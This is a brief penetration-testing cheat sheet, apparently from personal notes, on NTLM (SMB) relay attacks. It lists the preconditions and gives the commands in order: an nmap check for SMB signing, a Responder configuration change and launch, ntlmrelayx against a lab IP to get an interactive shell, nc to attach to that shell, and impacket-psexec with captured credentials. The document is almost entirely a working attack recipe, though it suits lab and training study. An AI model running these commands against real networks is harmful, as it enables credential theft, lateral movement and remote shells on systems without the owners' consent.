# NTLM Relay

Also called `SMB Relay`

For this to work, `SMB Signing must be disabled` and the user whose credentials are relayed must be `administrator` on the machine.

```sh
nmap --script=smb2-security-mode IP
# look at the smb2-security-mode message:
	Host script results:
	| smb2-security-mode: 
	|   311: 
	|_    Message signing enabled but not required

# This shows us that our attack can work because signing is enabled and not required.
```

Next, you need to disable the SMB and HTTP services in responder.

```sh
sudo nano /usr/share/responder/Responder.conf
	[Responder Core]
	SMB = Off
	HTTP = Off
```

```sh
sudo responder -I eth0
```

Combine with impacket's ntlmrelayx, adding `-i` to the impacket-ntlmrelayx command to get a shell on the remote machine and use nc to interact with it.

```sh
ntlmrelayx.py -t 192.168.179.132 -smb2support -i
```

```sh
nc 127.0.0.1 NTRELAYX_PORT
```

```sh
impacket-psexec username:password@target-ip
```
